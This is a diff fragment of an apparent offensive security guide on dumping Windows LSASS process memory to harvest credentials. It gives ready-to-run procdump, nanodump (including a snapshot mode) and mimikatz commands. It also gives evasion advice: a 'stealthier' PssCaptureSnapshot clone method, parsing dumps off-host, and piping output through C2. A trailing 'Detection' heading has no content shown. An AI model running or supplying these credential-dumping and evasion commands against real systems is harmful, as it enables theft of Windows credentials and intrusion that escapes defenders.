@@ -45,9 +45,10 @@ procdump.exe -accepteula -ma lsass.exe C:\Windows\Tasks\d.dmp
 nanodump.x64.exe --write C:\Windows\Tasks\d.dmp --valid    :: or pipe out via C2 with --getpid
 ```
 ```powershell
-# D) PssCaptureSnapshot (stealthier) — compile scripts/lsass_snapshot_dump.c
-#    gcc scripts/lsass_snapshot_dump.c -o snap.exe -lDbghelp
-.\snap.exe C:\Windows\Tasks\d.dmp
+# D) PssCaptureSnapshot (stealthier) — dump from a process-snapshot CLONE of lsass
+#    (handle-dup -> PssCaptureSnapshot -> MiniDumpWriteDump on the clone), avoiding a direct
+#    handle to live lsass. Use nanodump's snapshot mode or an equivalent PssCaptureSnapshot loader.
+nanodump.x64.exe --snapshot --write C:\Windows\Tasks\d.dmp
 ```
 Parse the dump **off-host** (never run mimikatz on the target if avoidable):
 ```bash
@@ -95,8 +96,8 @@ mimikatz # lsadump::cache          :: MSCACHEv2 (mscash2) — hashcat -m 2100
 cmdkey /list                       :: enumerate stored Windows credentials (no plaintext)
 ```
 
-`scripts/lsass_snapshot_dump.c` implements the PssCaptureSnapshot → MiniDumpWriteDump path
-(handle-dup, snapshot, dump from the clone) — the stealthier LSASS dump used in Quick Start.
+The PssCaptureSnapshot → MiniDumpWriteDump path (handle-dup, snapshot, dump from the clone) is the
+stealthier LSASS acquisition — use nanodump's snapshot mode or an equivalent loader; parse off-host.
 
 ## Detection
 
